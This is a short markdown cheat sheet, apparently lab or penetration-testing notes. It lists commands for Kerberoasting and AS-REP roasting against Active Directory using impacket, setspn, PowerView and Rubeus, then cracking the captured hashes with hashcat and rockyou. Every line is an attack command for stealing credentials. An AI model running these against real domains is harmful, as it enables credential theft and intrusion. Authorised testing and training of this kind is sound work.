# Kerberoasting

## Check

```sh
impacket-GetUserSPNs domain/username:'password' -dc-ip $target
```
### Windows only check

```sh
setspn -T <domain> -Q */*
```
#### PowerView

```sh
Get-DomainUser -SPN -Properties samaccountname,serviceprincipalname,pwdlastset,lastlogon
```
## Request

```sh
impacket-GetUserSPNs domain/username:'password' -dc-ip $target -request
```
### Windows only request

```sh
./Rubeus.exe kerberoast /outfile:hashes.txt
```
## Crack it

```sh
hashcat -m 13100 hash /usr/share/wordlists/rockyou.txt
```
# AS-REP Roasting

```sh
impacket-GetNPUsers INLANEFREIGHT.LOCAL/ -usersfile users.txt -no-pass -dc-ip <DC_IP> -format hashcat -outputfile asrep_hashes.txt

impacket-GetNPUsers INLANEFREIGHT.LOCAL/mholliday -request -dc-ip <DC_IP>
```
## Crack

```sh
hashcat -m 18200 ilfreight_asrep /usr/share/wordlists/rockyou.txt
```
